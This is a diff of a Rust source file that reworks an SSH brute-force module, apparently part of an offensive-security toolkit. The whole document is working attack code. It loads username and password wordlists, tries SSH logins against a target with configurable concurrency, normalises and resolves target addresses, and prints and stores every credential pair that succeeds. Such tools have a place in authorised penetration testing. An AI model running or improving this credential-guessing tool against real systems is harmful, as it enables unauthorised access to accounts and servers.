@@ -1,18 +1,17 @@
 use anyhow::{anyhow, Result};
 use colored::*;
+use futures::stream::{FuturesUnordered, StreamExt};
 use ssh2::Session;
 use std::{
     fs::File,
     io::{BufRead, BufReader, Write},
-    net::TcpStream,
+    net::{TcpStream, ToSocketAddrs},
     path::{Path, PathBuf},
     sync::Arc,
 };
-use tokio::{
-    sync::{Mutex, Semaphore},
-    task::spawn_blocking,
-    time::{sleep, Duration},
-};
+use std::sync::atomic::{AtomicBool, Ordering};
+use regex::Regex;
+use tokio::{sync::Mutex, task::spawn_blocking, time::{sleep, Duration}};
 
 pub async fn run(target: &str) -> Result<()> {
     println!("=== SSH Brute Force Module ===");
@@ -26,8 +25,8 @@ pub async fn run(target: &str) -> Result<()> {
         }
     };
 
-    let usernames_file = prompt_required("Username wordlist")?;
-    let passwords_file = prompt_required("Password wordlist")?;
+    let usernames_file = prompt_existing_file("Username wordlist")?;
+    let passwords_file = prompt_existing_file("Password wordlist")?;
 
     let concurrency: usize = loop {
         let input = prompt_default("Max concurrent tasks", "10")?;
@@ -47,97 +46,103 @@ pub async fn run(target: &str) -> Result<()> {
     let verbose = prompt_yes_no("Verbose mode?", false)?;
     let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false)?;
 
-    let initial_addr = format!("{}:{}", target, port);
-    let connect_addr = format_host_port(&initial_addr)?;
+    let connect_addr = normalize_target(target, port)?;
 
     let found = Arc::new(Mutex::new(Vec::new()));
-    let stop = Arc::new(Mutex::new(false));
+    let stop = Arc::new(AtomicBool::new(false));
 
     println!("\n[*] Starting brute-force on {}", connect_addr);
 
-    let user_list = load_lines(&usernames_file)?;
-    if user_list.is_empty() {
+    let users = load_lines(&usernames_file)?;
+    if users.is_empty() {
         println!("[!] Username wordlist is empty or invalid. Exiting.");
         return Ok(());
     }
-    let users = Arc::new(user_list);
-
-    let pass_file = File::open(&passwords_file)?;
-    let pass_buf = BufReader::new(pass_file);
-    let pass_lines: Vec<String> = pass_buf
-        .lines()
-        .filter_map(|line| line.ok().map(|s| s.trim().to_string()))
-        .filter(|line| !line.is_empty())
-        .collect();
-    if pass_lines.is_empty() {
+    let passwords = load_lines(&passwords_file)?;
+    if passwords.is_empty() {
         println!("[!] Password wordlist is empty or invalid. Exiting.");
         return Ok(());
     }
 
-    let semaphore = Arc::new(Semaphore::new(concurrency));
-    let mut tasks = Vec::new();
-    let mut user_cycle_idx = 0;
+    let users = Arc::new(users);
+    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();
+    let mut user_cycle_idx = 0usize;
 
-    for pass_str in pass_lines {
-        if *stop.lock().await {
+    for pass in passwords {
+        if stop_on_success && stop.load(Ordering::Relaxed) {
             break;
         }
 
-        let users_for_current_pass: Box<dyn Iterator<Item = String>> = if combo_mode {
-            Box::new(users.iter().cloned())
+        let selected_users: Vec<String> = if combo_mode {
+            users.iter().cloned().collect()
         } else {
             if users.is_empty() {
-                Box::new(std::iter::empty())
+                Vec::new()
             } else {
                 let user = users[user_cycle_idx % users.len()].clone();
                 user_cycle_idx += 1;
-                Box::new(std::iter::once(user))
+                vec![user]
             }
         };
 
-        for user_str in users_for_current_pass {
-            if *stop.lock().await {
+        if selected_users.is_empty() {
+            continue;
+        }
+
+        for user in selected_users {
+            if stop_on_success && stop.load(Ordering::Relaxed) {
                 break;
             }
 
-            let permit = Arc::clone(&semaphore).acquire_owned().await?;
-            
-            let task_addr = connect_addr.clone();
-            let task_user = user_str;
-            let task_pass = pass_str.clone();
+            let addr_clone = connect_addr.clone();
+            let user_clone = user.clone();
+            let pass_clone = pass.clone();
             let found_clone = Arc::clone(&found);
             let stop_clone = Arc::clone(&stop);
+            let stop_flag = stop_on_success;
+            let verbose_flag = verbose;
 
-            let task = tokio::spawn(async move {
-                let _permit = permit;
-
-                if *stop_clone.lock().await {
+            tasks.push(tokio::spawn(async move {
+                if stop_flag && stop_clone.load(Ordering::Relaxed) {
                     return;
                 }
 
-                match try_ssh_login(&task_addr, &task_user, &task_pass).await {
+                match try_ssh_login(&addr_clone, &user_clone, &pass_clone).await {
                     Ok(true) => {
-                        println!("[+] {} -> {}:{}", task_addr, task_user, task_pass);
-                        found_clone.lock().await.push((task_addr.clone(), task_user.clone(), task_pass.clone()));
-                        if stop_on_success {
-                            *stop_clone.lock().await = true;
+                        println!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone);
+                        found_clone
+                            .lock()
+                            .await
+                            .push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
+                        if stop_flag {
+                            stop_clone.store(true, Ordering::Relaxed);
                         }
                     }
                     Ok(false) => {
-                        log(verbose, &format!("[-] {} -> {}:{}", task_addr, task_user, task_pass));
+                        log(verbose_flag, &format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone));
                     }
                     Err(e) => {
-                        log(verbose, &format!("[!] {}: error: {}", task_addr, e));
+                        log(verbose_flag, &format!("[!] {}: error: {}", addr_clone, e));
                     }
                 }
+
                 sleep(Duration::from_millis(10)).await;
-            });
-            tasks.push(task);
+            }));
+
+            if tasks.len() >= concurrency {
+                if let Some(res) = tasks.next().await {
+                    if let Err(e) = res {
+                        log(verbose, &format!("[!] Task join error: {}", e));
+                    }
+                }
+            }
         }
     }
 
-    for task in tasks {
-        let _ = task.await;
+    while let Some(res) = tasks.next().await {
+        if let Err(e) = res {
+            log(verbose, &format!("[!] Task join error: {}", e));
+        }
     }
 
     let creds = found.lock().await;
@@ -186,36 +191,46 @@ async fn try_ssh_login(normalized_addr: &str, user: &str, pass: &str) -> Result<
     Ok(result)
 }
 
-fn format_host_port(input: &str) -> Result<String> {
-    if input.starts_with('[') {
-        if let Some(end_bracket_idx) = input.find("]:") {
-            let host_part = &input[1..end_bracket_idx];
-            if !host_part.contains('[') && !host_part.contains(']') {
-                if (&input[end_bracket_idx+2..]).parse::<u16>().is_ok() {
-                     return Ok(input.to_string());
-                }
-            }
-        }
-    }
-
-    let (host_candidate, port_str) = match input.rfind(':') {
-        Some(idx) if idx > 0 => { // Ensure colon is not the first character
-            let (h, p) = input.split_at(idx);
-            (h, &p[1..]) // Strip colon from port part
-        }
-        _ => return Err(anyhow!("Invalid target address format: '{}' - missing port or malformed", input)),
-    };
-    
-    if port_str.parse::<u16>().is_err() {
-        return Err(anyhow!("Invalid port in address: '{}'", input));
-    }
-
-    let stripped_host = host_candidate.trim_matches(|c| c == '[' || c == ']');
-
-    if stripped_host.contains(':') {
-        Ok(format!("[{}]:{}", stripped_host, port_str))
+fn normalize_target(host: &str, default_port: u16) -> Result<String> {
+    let re = Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$").unwrap();
+    let trimmed = host.trim();
+    let caps = re
+        .captures(trimmed)
+        .ok_or_else(|| anyhow!("Invalid target format: {}", host))?;
+    let addr = caps.name("addr").unwrap().as_str();
+    let port = if let Some(m) = caps.name("port") {
+        m.as_str()
+            .parse::<u16>()
+            .map_err(|_| anyhow!("Invalid port value in target '{}'", host))?
     } else {
-        Ok(format!("{}:{}", stripped_host, port_str))
+        default_port
+    };
+    let formatted = if addr.contains(':') && !addr.contains('.') {
+        format!("[{}]:{}", addr, port)
+    } else {
+        format!("{}:{}", addr, port)
+    };
+
+    formatted
+        .to_socket_addrs()
+        .map_err(|e| anyhow!("Could not resolve '{}': {}", formatted, e))?
+        .next()
+        .ok_or_else(|| anyhow!("Could not resolve '{}'", formatted))?;
+
+    Ok(formatted)
+}
+
+fn prompt_existing_file(msg: &str) -> Result<String> {
+    loop {
+        let candidate = prompt_required(msg)?;
+        if Path::new(&candidate).is_file() {
+            return Ok(candidate);
+        } else {
+            println!(
+                "{}",
+                format!("File '{}' does not exist or is not a regular file.", candidate).yellow()
+            );
+        }
     }
 }
 
